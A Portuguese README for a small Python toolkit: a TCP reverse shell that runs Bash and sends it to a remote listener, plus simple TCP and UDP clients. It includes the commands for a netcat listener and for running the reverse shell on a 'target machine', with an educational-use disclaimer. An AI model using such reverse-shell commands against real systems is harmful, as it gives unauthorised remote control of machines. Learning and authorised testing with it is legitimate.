# Ferramentas de Conexão TCP/UDP e Reverse Shell

Este projeto contém scripts Python para comunicação via TCP, UDP e para criação de uma reverse shell.

## Arquivos
- `reverse-shell-tcp.py`: Script principal que implementa uma reverse shell via TCP.
- `simple-client-tcp.py`: Cliente simples para conexão TCP e troca de mensagens.
- `simple-client-udp.py`: Cliente simples para conexão UDP e troca de mensagens.

## Como funciona

### reverse-shell-tcp.py
O script conecta-se a um servidor remoto (listener) especificado por IP e porta, redirecionando a entrada e saída padrão para o socket, e executa um shell Bash. Isso permite que o servidor remoto execute comandos no sistema onde o script está rodando.

### simple-client-tcp.py
Permite conectar-se a um servidor TCP, enviar uma mensagem e receber uma resposta. Útil para testes de comunicação TCP.

### simple-client-udp.py
Permite enviar e receber mensagens de/para um servidor UDP em modo interativo. Útil para testes de comunicação UDP.

## Uso

### 1. Reverse Shell TCP
**No servidor listener:**
```bash
nc -lvnp <porta>
```
**Na máquina alvo:**
```bash
python3 reverse-shell-tcp.py <ip_do_servidor> <porta>
```
- `<ip_do_servidor>`: IP do listener
- `<porta>`: Porta usada pelo listener

### 2. Cliente TCP Simples
```bash
python3 simple-client-tcp.py
```
- Informe o IP e a porta do servidor TCP quando solicitado.

### 3. Cliente UDP Simples
```bash
python3 simple-client-udp.py
```
- Informe o IP e a porta do servidor UDP quando solicitado.
- Digite mensagens para enviar ao servidor. Para sair, envie "/sair".

## Exemplo
```bash
# Listener TCP
nc -lvnp 4444

# Cliente TCP
python3 simple-client-tcp.py
# (Digite o IP e a porta do listener)

# Cliente UDP
python3 simple-client-udp.py
# (Digite o IP e a porta do listener UDP)
```

## Requisitos
- Python 3.x
- Sistema operacional com `/bin/bash` disponível (para reverse shell)

## Aviso Legal
> **Atenção:** Estes scripts são para fins educacionais e de teste em ambientes controlados e autorizados. O uso não autorizado pode ser ilegal. O autor não se responsabiliza por qualquer uso indevido. 